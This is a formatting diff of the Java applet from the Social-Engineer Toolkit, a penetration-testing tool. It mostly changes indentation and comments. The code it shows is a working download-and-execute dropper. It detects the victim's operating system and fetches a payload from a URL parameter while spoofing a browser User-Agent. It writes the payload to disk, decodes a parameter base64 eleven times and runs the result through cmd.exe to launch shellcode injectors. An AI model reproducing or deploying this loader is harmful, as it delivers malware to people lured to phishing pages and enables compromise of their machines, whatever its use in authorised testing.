@@ -7,14 +7,13 @@ import sun.misc.BASE64Decoder;
 import java.net.URL;
 import java.net.URLConnection;
 
- /**************************************************************
- *
- *    Java Applet for the Social-Engineer Toolkit
- *    Original work from Thomas Werth and customized
- *    by Dave Kennedy (@HackingDave). 
- *
- **************************************************************/
-
+/**************************************************************
+*
+*    Java Applet for the Social-Engineer Toolkit
+*    Original work from Thomas Werth and customized
+*    by Dave Kennedy (@HackingDave). 
+*
+**************************************************************/
 public class Java extends Applet {
 
 	private Object initialized = null;
@@ -43,8 +42,8 @@ public class Java extends Applet {
             String  fourthParm = "";
             String  fifthParm  = "";
     	    String  sixthParm  = "";
-	    String  seventhParm = "";
-	    String  eightParm = "";
+	        String  seventhParm = "";
+	        String  eightParm = "";
             short osType = -1 ;  // 0=WIN, 1=MAC, 2=NIX
             if  (os.indexOf( "win" ) >= 0) // We are running Windows then
             {
@@ -63,19 +62,19 @@ public class Java extends Applet {
                 thirdParm   =   getParameter( "5" );
                 fourthParm  =   getParameter( "6" );
                 fifthParm   =   getParameter( "7" );
-	    	sixthParm   =   getParameter( "8" );
-		seventhParm =   getParameter( "9" );
-		eightParm   =   getParameter( "10" );
+	    	    sixthParm   =   getParameter( "8" );
+		        seventhParm =   getParameter( "9" );
+		        eightParm   =   getParameter( "10" );
                 osType      =   0;
                 pfad += token + ".exe";
             	}
-                	else if (os.indexOf("mac") >= 0) //MAC
+                	else if (os.indexOf("mac") >= 0) // OSX
             	{
                 	downParm    =   getParameter( "3" );
                 	osType      =   1;
-		        // look for special folders to define snow leopard, etc.
-  		        if (pfad.startsWith("/var/folders/")) pfad = "/tmp/"; // OSX SNOW LEOPARD AND ABOVE
-	                pfad += token + ".bin";
+		            // look for special folders to define snow leopard, etc.
+  		            if (pfad.startsWith("/var/folders/")) pfad = "/tmp/"; // OSX SNOW LEOPARD AND ABOVE
+	                    pfad += token + ".bin";
                 }
                 else if (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0) // UNIX
                 {
@@ -88,45 +87,45 @@ public class Java extends Applet {
 
 	   if ( osType < 1 )
 	   {
-	   // here we check for powershell
+	       // here we check for powershell
            File file = new File("c:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe");
-	   if (sixthParm.length() < 4) {
-  	   if (!file.exists()) {
- 	        // URL parameter
-        	URL url = new URL(downParm);
-            	// Open the conneciton
- 	    	URLConnection hc = url.openConnection();
-            	// set the user agent string
-            	hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
-            	// grab content type
-            	String contentType = hc.getContentType();
-            	// grab content length
-            	int contentLength = hc.getContentLength();
-            	// pull input stream
-	        InputStream raw = hc.getInputStream();
-            	// stream buffer into raw input stream
-    	    	InputStream in = new BufferedInputStream(raw);
-            	// write the bytes out
-       	    	byte[] data = new byte[contentLength];
-            	int bytesRead = 0;
-            	int offset = 0;
-            	while (offset < contentLength) {
-                	bytesRead = in.read(data, offset, data.length - offset);
-                	if (bytesRead == -1)
+	       if (sixthParm.length() < 4) {
+  	            if (!file.exists()) {
+ 	                // URL parameter
+        	        URL url = new URL(downParm);
+            	    // Open the conneciton
+ 	    	        URLConnection hc = url.openConnection();
+            	    // set the user agent string
+            	    hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
+            	    // grab content type
+            	    String contentType = hc.getContentType();
+            	    // grab content length
+            	    int contentLength = hc.getContentLength();
+            	    // pull input stream
+	                InputStream raw = hc.getInputStream();
+            	    // stream buffer into raw input stream
+    	    	    InputStream in = new BufferedInputStream(raw);
+            	    // write the bytes out
+       	    	    byte[] data = new byte[contentLength];
+            	    int bytesRead = 0;
+            	    int offset = 0;
+            	    while (offset < contentLength) {
+                	    bytesRead = in.read(data, offset, data.length - offset);
+                	    if (bytesRead == -1)
                     	break;
-	                offset += bytesRead;
+	                    offset += bytesRead;
 		            }
-            	// close it
-            	in.close();
-            	// write file out to pfad
-            	String filename = url.getFile();
-            	FileOutputStream out = new FileOutputStream(pfad);
-            	// close everything out
-	        out.write(data);
-        	out.flush();
-                out.close();
-                }
-		}
+            	    // close it
+            	    in.close();
+            	    // write file out to pfad
+            	    String filename = url.getFile();
+            	    FileOutputStream out = new FileOutputStream(pfad);
+            	    // close everything out
+	                out.write(data);
+        	        out.flush();
+                    out.close();
+                    }
+		    }
 		}
 
 		if ( osType < 1 )
@@ -174,8 +173,6 @@ public class Java extends Applet {
                 //}
 
                 }
-
-
 
     	// download file all other OS
 		if ( osType > 1 ){
@@ -297,8 +294,8 @@ public class Java extends Applet {
 			if (sixthParm.length() > 2)
 			{
 				// all parameters are base64 encoded, this will decode for us and pass the decoded strings
-                		BASE64Decoder decoder = new BASE64Decoder();
-                		byte[] decoded = decoder.decodeBuffer(nextParm);
+                BASE64Decoder decoder = new BASE64Decoder();
+                byte[] decoded = decoder.decodeBuffer(nextParm);
 				// decode again
 				String decoded_string =  new String(decoded);
 				String decoded_string_2 = new String(decoder.decodeBuffer(decoded_string));
@@ -316,10 +313,10 @@ public class Java extends Applet {
 				String decoded_string_8 = new String(decoder.decodeBuffer(decoded_string_7));
 				// again
 				String decoded_string_9 = new String(decoder.decodeBuffer(decoded_string_8));
-                		// again
-		                String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
-		                // last one
-                		String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));
+                // again
+		        String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
+		        // last one
+                String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));
 
 				PrintStream out = null;
 				String randomfile = Long.toString(Math.abs(r.nextLong()), 36);
@@ -333,11 +330,11 @@ public class Java extends Applet {
 				    if (out != null) out.close();
 				}
 					// this is if we are using multipyinjector
-			                f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + writedir + randomfile + " " + eightParm);
+			        f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + writedir + randomfile + " " + eightParm);
 					// this runs the single instance of shellcodeexec, pyinjector, or a binary
 					f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + decoded_string_11 + "\"");
 				}
-	                 }
+	            }
 
             }
         else // if not windows then use linux/osx/etc.
